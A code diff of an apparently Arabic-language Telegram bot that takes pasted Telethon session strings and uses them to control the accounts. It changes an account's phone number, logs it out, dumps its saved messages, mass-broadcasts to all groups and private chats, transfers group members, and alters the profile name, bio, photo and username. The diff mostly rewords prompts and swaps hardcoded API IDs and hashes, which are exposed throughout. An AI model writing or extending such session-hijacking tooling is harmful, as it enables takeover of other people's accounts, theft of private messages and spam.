             except telethon.errors.rpcerrorlist.QueryIdInvalidError:
                 await event.respond("""An error occurred. Please try again later.""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -1708,7 +1662,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can change phone number.
                            
-الان ارسل لي كود الترمكس لكي اغير رقم الحساب""")
+الان ارسل لي كود السيشن لكي اغير رقم الحساب""")
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)
@@ -1750,9 +1704,7 @@ async def users(event):
         
 خطا حدث ارسل هاذا للمالكين""" + str(e))
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 channel_id = os.environ.get("CHANNEL_ID")
@@ -1796,7 +1748,7 @@ async def connect(event):
 import asyncio
 from telethon import types
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -1815,7 +1767,7 @@ async def gcasta(strses, msg):
             pass
 
 async def gcastap(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     try:
             reply_msg = msg
@@ -1845,16 +1797,14 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can gcast to all.
                            
-الان ارسل لي كود الترمكس للكل""")
+الان ارسل لي كود السيشن للكل""")
                                  
             strses = await x.wait_event(events.NewMessage)
             session = validate_session(strses.text)
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
 
             await x.send_message("""Send message.
@@ -1886,9 +1836,7 @@ async def users(event):
                 
 حدث خطا اثناء البث""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
@@ -1896,7 +1844,7 @@ async def users(event):
 
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -1918,7 +1866,7 @@ async def gcastb(strses, msg):
             print(e)
 
 async def gcastbp(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     try:
             reply_msg = msg
@@ -1951,15 +1899,13 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session to gcast in groups
             
-الان ارسل لي الترمكس لكي ارسلها الى الكروبات""")
+الان ارسل لي السيشن لكي ارسلها الى الكروبات""")
             strses = await x.wait_event(events.NewMessage)
             session = validate_session(strses.text)
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
             await x.send_message("""Send message
             
 ارسل الرسالة""")
@@ -1995,9 +1941,7 @@ async def users(event):
                 
 حدث خطا اثناء البث""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
@@ -2005,7 +1949,7 @@ async def users(event):
 
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -2025,7 +1969,7 @@ async def gcastc(strses, msg):
 
 
 async def gcastcp(strses, msg):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     try:
             reply_msg = msg
@@ -2055,15 +1999,13 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session to gcast in private
             
-ارسل لي الترمكس لكي ارسل الرسالة الى جميع الخاصات""")
+ارسل لي السيشن لكي ارسل الرسالة الى جميع الخاصات""")
             strses = await x.wait_event(events.NewMessage)
             session = validate_session(strses.text)
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
             await x.send_message("""Send message
             
 ارسل الرسالة""")
@@ -2093,9 +2035,7 @@ async def users(event):
                 
 حدث خطا اثناء البث""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             await event.reply("Invalid session. Please provide a valid Termux session.", buttons=keyboard)
@@ -2119,14 +2059,14 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can Log out.
                            
-الآن أرسل لي كود الترمكس لكي أسجل الخروج""")
+الآن أرسل لي كود السيشن لكي أسجل الخروج""")
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
             op = await cu(strses.text)
             if not op:
                 await event.respond("""Invalid Session. Please use another one.
         
-كود الترمكس غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
+كود السيشن غير صالح. الرجاء استخدام كود آخر.""", buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -2148,11 +2088,9 @@ async def users(event):
                 await termux_client.log_out()
                 await message.edit("""Logged out successfully from the provided Termux session.
             
-تم تسجيل الخروج بنجاح من جلسة الترمكس المقدمة.""", buttons=keyboard)
+تم تسجيل الخروج بنجاح من جلسة السيشن المقدمة.""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
 
@@ -2180,9 +2118,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
 
 
@@ -2211,9 +2147,7 @@ async def users(event):
 المستخدم ليس عضو في الكروب / قناة """)
      
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
             
@@ -2222,7 +2156,7 @@ async def users(event):
 
 
 async def savedmssgs(strses):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         i = ""
 
         # Get the saved messages instead of iterating through messages from a specific chat
@@ -2237,7 +2171,7 @@ async def savedmssgs(strses):
         
 
 async def savedmssgsp(strses, grp):
-    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient((strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     i = ""
 
@@ -2265,7 +2199,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can send you the saved messages .
                            
-الآن أرسل لي كود الترمكس لكي أرسل لك الرسائل المحفوظة """)
+الآن أرسل لي كود السيشن لكي أرسل لك الرسائل المحفوظة """)
                                  
             sender_id = event.sender_id 
             strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
@@ -2273,9 +2207,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
                 return
             try:
                 # Send a message with the initial loading bar
@@ -2296,9 +2228,7 @@ async def users(event):
             await message.edit(i + "\n\n start from top to bottom \n\n من الفوق الى الاسفل ابدا", buttons=keyboard)
         
         except TimeoutError:
-            return await event.respond("""Please provide the termux session withing 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         except Exception as e:
             await event.respond(f"An error occurred: {str(e)}")
 
@@ -2314,7 +2244,7 @@ async def users(event):
     async with client.conversation(event.chat_id) as x:
         try:
             await x.send_message("Now send me the Termux Session so I can transfer group members.\n\n"
-                                 "الان ارسل لي كود الترمكس لكي انقل اعضاء من كروب لاخر")
+                                 "الان ارسل لي كود السيشن لكي انقل اعضاء من كروب لاخر")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2358,11 +2288,11 @@ async def users(event):
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
             await event.respond("Invalid session or phone number. Please check your Termux Session.\n\n"
-                                "ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.",
+                                "ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود السيشن.",
                                 buttons=keyboard)
         except TimeoutError:
             return await event.respond("Please provide the Termux session within 60 seconds.\n\n"
-                                       "الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر",
+                                       "الرجاء ارسال السيشن قبل مرور ٦٠ ثانية من الضغط على الزر",
                                        buttons=keyboard)
 
 
@@ -2405,11 +2335,11 @@ async def connect(event):
 اختر ماذا تريد ان تفعل """, buttons=keyboard)
 
 async def chngenme(strses, new_name):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         await X(UpdateProfileRequest(first_name=new_name))
         
 async def chngenmep(strses, new_name):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
     await bot(UpdateProfileRequest(first_name=new_name))
     
@@ -2422,7 +2352,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can change the name for you.
                            
-الان ارسل لي كود الترمكس لكي اغير الاسم """)
+الان ارسل لي كود السيشن لكي اغير الاسم """)
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2456,13 +2386,11 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
             return await event.respond("""Please provide the termux session within 60 seconds
             
-الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+الرجاء ارسال السيشن قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
 
 
 
@@ -2482,7 +2410,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can change the bio for you.
                            
-الان ارسل لي كود الترمكس لكي اغير البايو """)
+الان ارسل لي كود السيشن لكي اغير البايو """)
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2515,18 +2443,16 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
             return await event.respond("""Please provide the termux session within 60 seconds
             
-الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""",
+الرجاء ارسال السيشن قبل مرور ٦٠ ثانية من الضغط على الزر""",
                                        buttons=keyboard)
 
 
 async def changebio(strses, new_bio):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         await X(UpdateProfileRequest(about=new_bio))
 
 
@@ -2545,7 +2471,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can schange the profile picture
                            
-الان ارسل لي كود الترمكس لكي ااغير صورة المستخدم""")
+الان ارسل لي كود السيشن لكي ااغير صورة المستخدم""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2578,13 +2504,11 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
             return await event.respond("""Please provide the termux session within 60 seconds
             
-الرجاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""",
+الرجاء ارسال السيشن قبل مرور ٦٠ ثانية من الضغط على الزر""",
                                        buttons=keyboard)
 
 from telethon.tl.types import InputPhotoEmpty, InputStickerSetEmpty
@@ -2599,7 +2523,7 @@ from io import BytesIO
 from PIL import Image
 
 async def changeprofilepic(strses, profile_pic_msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         try:
             if profile_pic_msg.photo:
                 photo = await profile_pic_msg.download_media()
@@ -2638,7 +2562,7 @@ async def users(event):
         try:
             await x.send_message("""Now send me the Termux Session so I can change the username for you
                            
-الان ارسل لي كود الترمكس لكي ااغير يوزر المستخدم """)
+الان ارسل لي كود السيشن لكي ااغير يوزر المستخدم """)
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
 
@@ -2677,13 +2601,11 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
             return await event.respond("""Please provide the termux session and new username within 60 seconds.
             
-الرحاء ارسال الترمكس والمعرف الجديد قبل مرور ٦٠ ثانية من الضغط على الزر""",
+الرحاء ارسال السيشن والمعرف الجديد قبل مرور ٦٠ ثانية من الضغط على الزر""",
                                        buttons=keyboard)
         except Exception as e:
             return await event.respond("An unexpected error occurred. Please try again later.", buttons=keyboard)
@@ -2693,7 +2615,7 @@ from telethon.tl.functions.account import UpdateUsernameRequest
 
 
 async def changeuse(strses, new_username):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e") as X:
         await X(UpdateUsernameRequest(username=new_username))
 
 
@@ -2741,7 +2663,7 @@ async def connect(event):
 
 
 async def eeobot(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     try:
@@ -2785,9 +2707,7 @@ async def users(event):
 
     async with client.conversation(event.chat_id) as x:
         try:
-            await x.send_message("""Now send me the Termux Session so I can start the process.
-                           
-الان ارسل لي كود الترمكس لبدء العملية""")
+            await x.send_message("""✨ - الان ارسل لي كود السيشن""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2798,9 +2718,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
             
             response_msg = await eeobot(strses.text)
 
@@ -2811,19 +2729,15 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the Termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         
 
 
 
 async def xnsex21bot(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     try:
@@ -2867,9 +2781,7 @@ async def users(event):
 
     async with client.conversation(event.chat_id) as x:
         try:
-            await x.send_message("""Now send me the Termux Session so I can start the process.
-                           
-الان ارسل لي كود الترمكس لبدء العملية""")
+            await x.send_message("""✨ - الان ارسل لي كود السيشن""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2880,9 +2792,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
             
             response_msg = await xnsex21bot(strses.text)
 
@@ -2893,19 +2803,15 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the Termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
 
 
 
 
 async def MARKTEBOT(strses):
-    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    bot = TelegramClient(ses(strses), 26973196, "fb9f1182117226f6698fb180defd2b6e")
     await bot.connect()
 
     try:
@@ -2949,9 +2855,7 @@ async def users(event):
 
     async with client.conversation(event.chat_id) as x:
         try:
-            await x.send_message("""Now send me the Termux Session so I can start the process.
-                           
-الان ارسل لي كود الترمكس لبدء العملية""")
+            await x.send_message("""✨ - الان ارسل لي كود السيشن""")
             strses = await x.wait_event(events.NewMessage, timeout=60)
 
             # Check if the session is empty
@@ -2962,9 +2866,7 @@ async def users(event):
             if session:
                 pass
             else:
-                return await event.respond("""Invalid Session, please use another one.
-                                   
-ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return await event.respond("""❌ - يرجئ التاكد من السيشن لانه خاطئ  """, buttons=keyboard)
             
             response_msg = await MARKTEBOT(strses.text)
 
@@ -2975,13 +2877,9 @@ async def users(event):
 
         except (SessionPasswordNeededError):
             # Handle session error or invalid phone number
-            await event.respond("""Invalid session or phone number. Please check your Termux Session.
-                                   
-ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
+            await event.respond("""⛔️ - السيشن خاطئ أو رقم هاتف غير صالح. يرجى التحقق من السيشن .""", buttons=keyboard)
         except TimeoutError:
-            return await event.respond("""Please provide the Termux session within 60 seconds
-            
-الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+            return await event.respond("""⚠️ - الرجاء ارسل السيشن امامك 60 ثانية .""", buttons=keyboard)
         
 
 rules = '''
